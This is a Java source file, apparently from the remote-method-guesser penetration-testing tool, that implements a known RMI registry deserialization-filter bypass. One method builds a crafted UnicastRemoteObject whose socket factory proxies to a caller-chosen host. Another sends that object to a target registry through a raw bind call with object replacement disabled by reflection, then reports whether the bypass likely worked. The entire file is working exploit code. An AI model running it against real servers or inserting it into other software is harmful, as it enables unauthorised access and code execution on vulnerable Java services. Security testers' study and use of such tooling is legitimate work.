package de.qtc.rmg.operations;

import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.server.ObjID;
import java.rmi.server.RMIClientSocketFactory;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;

import de.qtc.rmg.io.Logger;
import de.qtc.rmg.networking.DummySocketFactory;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.RMIWhisperer;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.StreamRemoteCall;
import sun.rmi.transport.tcp.TCPEndpoint;

/*
 * The bypass technique implemented by this code was discovered by An Trinh (@_tint0) and a detailed analysis was provided by
 * Hans-Martin Münch (@h0ng10). Certain portions of the code were copied from the corresponding blog post: https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/
 */

@SuppressWarnings("restriction")
public class RegistryClient {

    private RMIWhisperer rmi;

    private Field ssfField;
    private Field enableReplaceField;
    private Constructor<?> constructor;

    private static final long interfaceHash = 4905912898345647071L;

    public RegistryClient(RMIWhisperer rmiRegistry)
    {
        this.rmi = rmiRegistry;

        try {
            constructor = UnicastRemoteObject.class.getDeclaredConstructor(int.class, RMIClientSocketFactory.class, RMIServerSocketFactory.class);
            constructor.setAccessible(true);

            ssfField = UnicastRemoteObject.class.getDeclaredField("ssf");
            ssfField.setAccessible(true);

            enableReplaceField = ObjectOutputStream.class.getDeclaredField("enableReplace");
            enableReplaceField.setAccessible(true);

        } catch(NoSuchMethodException | SecurityException | NoSuchFieldException e) {
            Logger.eprintlnMixedYellow("Unexpected Exception caught during", "RegistryClient", "instantiation.");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();
        }
    }

    public Object generateBypassObject(String host, int port)
    {
        TCPEndpoint endpoint = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));

        RemoteObjectInvocationHandler payloadInvocationHandler = new RemoteObjectInvocationHandler(refObject);
        RMIServerSocketFactory proxySSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
            RMIServerSocketFactory.class.getClassLoader(),
            new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
            payloadInvocationHandler);

        UnicastRemoteObject payloadObject = null;

        try {
            payloadObject = (UnicastRemoteObject)constructor.newInstance(new Object[]{0, null, new DummySocketFactory()});
            UnicastRemoteObject.unexportObject(payloadObject, true);

            ssfField.set(payloadObject, proxySSF);

        } catch( Exception e ) {
            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during registry.bind() call.");
            Logger.println("Please report this to improve rmg :)");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();
        }

        return payloadObject;
    }

    @SuppressWarnings("deprecation")
    public void bindCall(Object payloadObject)
    {
        try {
            Endpoint endpoint = rmi.getEndpoint();
            RemoteRef remoteRef = new UnicastRef(new LiveRef(new ObjID(ObjID.REGISTRY_ID), endpoint, false));

            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, 0, interfaceHash);
            try {
                ObjectOutputStream out = (ObjectOutputStream)call.getOutputStream();
                enableReplaceField.set(out, false);

                out.writeObject("Bypass incomming...");
                out.writeObject(payloadObject);

            } catch(java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling arguments", e);
            }

            remoteRef.invoke(call);
            remoteRef.done(call);

        } catch(java.rmi.ConnectException e) {
            Logger.eprintlnMixedYellow("Caught", "ConnectException", "during DGC operation.");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();

        } catch(java.rmi.ConnectIOException e) {
            Logger.eprintlnMixedYellow("Caught", "ConnectIOException", "during DGC operation.");
            Logger.eprintlnMixedBlue("Remote endpoint probably uses an", "SSL socket");
            Logger.eprintlnMixedYellow("Retry with the", "--ssl", "option.");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();

        } catch(java.rmi.ServerException e) {

            Throwable cause = RMGUtils.getCause(e);
            if( cause instanceof java.rmi.AccessException && cause.getMessage().contains("is non-local host")) {
                Logger.eprintlnMixedYellow("Deserialization filter bypass", "failed.");
                Logger.eprintlnMixedYellow("The targeted server is most likely patched", "(not vulnerable)");
                RMGUtils.showStackTrace(e);
            }

        } catch( Exception e ) {
            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during registry.bind() call.");
            Logger.println("Please report this to improve rmg :)");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();
        }

        Logger.printlnMixedBlue("Caught", "no Exception", "during the registry.bind() call.");
        Logger.printlnMixedYellow("Deserialization filter bypass", "probably worked :)");
    }
}
